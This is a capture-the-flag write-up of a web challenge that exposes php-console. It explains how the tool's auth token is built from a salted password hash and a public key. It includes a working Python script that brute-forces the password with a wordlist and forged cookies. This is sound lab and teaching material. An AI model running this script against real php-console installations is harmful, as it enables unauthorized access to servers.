# Console

So when we launch the challenge and go on the webpage we are greeted with a php info page with something that stands out:

<figure><img src="../../../../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>

after looking up what was php-console we can see this repository:

{% embed url="https://github.com/barbushin/php-console" %}

So from what i see i need to launch the tool in a chromium browser and it's not in the extension store so i clone the repo of the extension, go in the extension manager and load the unpacked extension and select the php console extension folder, update and we'll be good:

<figure><img src="../../../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption><p>Now we can use it </p></figcaption></figure>

So let's go back on our phpinfo page and refresh it, the extension should prompt us for some sort of password:

<figure><img src="../../../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

I enter test as... a test and nothing seems to change and then i decide to go and see the cookies of our page and see a php-console cookie that was not here before:

<figure><img src="../../../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

So i go and decode the base64 cookie to reveal the interesting content:

<figure><img src="../../../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

So i mess around for some time trying to see how the token is crafted then i try and re input a random password (helloworld) and see that the cookie changes slightly:

<figure><img src="../../../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

publicKey stayes the same but token changes and if a reinput the same password, the token is always the same so the token must be crafted using the password and god knows what other parameters

If we go in the github of the tool and look at the Auth.js file we find exactly what we want:

```javascript
function DomainAuth(domain, publicKey, passwordHash) {

	this.domain = domain;
	this.publicKey = publicKey;
	this.hash = passwordHash;

	this.getAuthToken = function() {
		if(this.hash && this.publicKey) {
			return window['CryptoJS']['SHA256'](this.hash + this.publicKey).toString();
		}
	};

	this.getSignature = function(string) {
		if(this.hash && this.publicKey) {
			return window['CryptoJS']['SHA256'](this.hash + this.publicKey + string).toString();
		}
	};

	this.getClientAuth = function() {
		var token = this.getAuthToken();
		if(token && this.publicKey) {
			return {
				'publicKey': this.publicKey,
				'token': token
			}
		}
	};
}
```

`this.getAuthToken` generates an authentication token by hashing the concatenation of `this.hash` and `this.publicKey` using the **SHA256** algorithm provided by `CryptoJS`

I am very bad with scripts for the moment so i went and got a script from a writeup:

```python
from pwn import *
import requests
import json

url = 'http://83.136.253.73:49889'
wordlist = open('/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt', 'r')
salt = 'NeverChangeIt:)'  # Salt used in hashing
public_key = '370244b500c702b16dddb1678c882d2b7aa0b3bcdf94fb6bb9e792460c5d460b'  # Grab from response header

for count, password in enumerate(wordlist):
    password = password.strip()
    if password:
        # sha256 the password and salt
        hashed_password = sha256sumhex((password + salt).encode())
        # sha256 the hashed password and the public key
        token = sha256sumhex((hashed_password + public_key).encode())

        # Build up a cookie
        php_console_server = 'php-console-server=5;'
        php_console_client = '{"php-console-client":5,"auth":{"publicKey":"' + public_key + '","token":"' + token + '"}}'
        headers = {'Cookie': php_console_server + 'php-console-client=' + b64e(php_console_client.encode())}

        # Send the request and grab PHP console header response
        response = requests.get(url, headers=headers)
        php_console_response = json.loads(response.headers['PHP-Console'])

        # Success?
        if php_console_response['auth']['isSuccess'] != False:
            print("Success! Correct password was: " + password)
            wordlist.close()
            quit()

print("Failed to find correct password :(")
wordlist.close()
```

and after getting the password and inputting it in the php console we were able to get the flag in the header of the app:

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
